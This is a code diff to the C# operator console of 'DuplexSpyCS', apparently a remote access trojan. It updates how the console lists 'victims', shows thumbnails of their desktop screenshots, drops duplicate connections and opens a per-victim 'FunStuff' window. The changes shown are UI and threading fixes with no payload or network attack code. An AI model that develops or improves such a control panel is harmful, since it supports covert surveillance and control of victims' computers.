@@ -20,6 +20,8 @@ namespace DuplexSpyCS
         int screen_width = 0;
         int screen_BigWidth = 0;
 
+        SemaphoreSlim _sem = new SemaphoreSlim(1, 1);
+
         /// <summary>
         /// Store class StreamWriter of file transfer.
         /// </summary>
@@ -195,7 +197,10 @@ namespace DuplexSpyCS
                     Invoke(new Action(() =>
                     {
                         string online_id = cmd[1];
-                        ListViewItem x = listView1.FindItemWithText(online_id);
+                        ListViewItem x = null;
+                        if (listView1.Items.Count > 0)
+                            x = listView1.FindItemWithText(online_id, true, 0);
+
                         if (x == null) //NEW VICTIM
                         {
                             v.ID = online_id;
@@ -215,6 +220,7 @@ namespace DuplexSpyCS
                             v.ID = online_id;
 
                             listView1.Items.Add(item);
+
                             ListViewItem k = listView2.FindItemWithText(online_id);
                             if (k != null)
                                 GetVictim(k).Disconnect();
@@ -231,9 +237,7 @@ namespace DuplexSpyCS
                             x.SubItems[10].Text = clsCrypto.b64D2Str(cmd[9]);
 
                             int width = 0;
-                            Invoke(new Action(() => width = listView1.Columns[0].Width));
-                            if (il_screen.Images.ContainsKey(v.ID))
-                                il_screen.Images.RemoveByKey(v.ID);
+                            width = listView1.Columns[0].Width;
 
                             if (width > 256)
                                 width = 255;
@@ -244,24 +248,34 @@ namespace DuplexSpyCS
                             il_screen.ImageSize = new Size(width, width);
                             Image img = clsTools.Base64ToImage(cmd[10]);
                             Bitmap bmp = new Bitmap(img, new Size(255, 255));
+
+                            string szGuid = Guid.NewGuid().ToString();
+                            if (il_screen.Images.ContainsKey(v.ID))
+                            {
+                                il_screen.Images.Add(szGuid, il_screen.Images[v.ID]);
+                                x.ImageKey = szGuid;
+                                il_screen.Images.RemoveByKey(v.ID);
+                            }
+
                             il_screen.Images.Add(v.ID, bmp);
+                            x.ImageKey = v.ID;
+                            if (il_screen.Images.ContainsKey(szGuid))
+                                il_screen.Images.RemoveByKey(szGuid);
+
                             v.img_LastDesktop = bmp;
 
-                            Invoke(new Action(() =>
+                            List<ListViewItem> lsItem = new List<ListViewItem>();
+                            foreach (ListViewItem item in listView1.Items)
                             {
-                                List<ListViewItem> lsItem = new List<ListViewItem>();
-                                foreach (ListViewItem item in listView1.Items)
-                                {
-                                    if (item.SubItems[1].Text == online_id)
-                                        lsItem.Add(item);
-                                }
+                                if (item.SubItems[1].Text == online_id)
+                                    lsItem.Add(item);
+                            }
 
-                                if (lsItem.Count > 1)
-                                {
-                                    for (int i = 1; i < lsItem.Count; i++)
-                                        listView1.Items.Remove(lsItem[i]);
-                                }
-                            }));
+                            if (lsItem.Count > 1)
+                            {
+                                for (int i = 1; i < lsItem.Count; i++)
+                                    listView1.Items.Remove(lsItem[i]);
+                            }
                         }
                     }));
                 }
@@ -1720,6 +1734,7 @@ namespace DuplexSpyCS
 
                 if (f == null)
                 {
+                    f = new frmFunStuff(victim);
                     f.Text = @$"FunStuff\\{f.v.ID}";
                     f.StartPosition = FormStartPosition.CenterScreen;
                     f.Show();
@@ -2294,6 +2309,24 @@ namespace DuplexSpyCS
         private void toolStripButton7_Click(object sender, EventArgs e)
         {
             new frmBoxHelper("Function\\Main").Show();
+        }
+
+        private void listView1_ColumnWidthChanged(object sender, ColumnWidthChangedEventArgs e)
+        {
+            if (e.ColumnIndex != 0)
+                return;
+
+            int width = listView1.Columns[0].Width;
+            if (width < 25)
+            {
+                width = 25;
+            }
+
+            if (width < 256)
+            {
+                il_screen.ImageSize = new Size(width, width);
+                screen_width = width;
+            }
         }
     }
 }
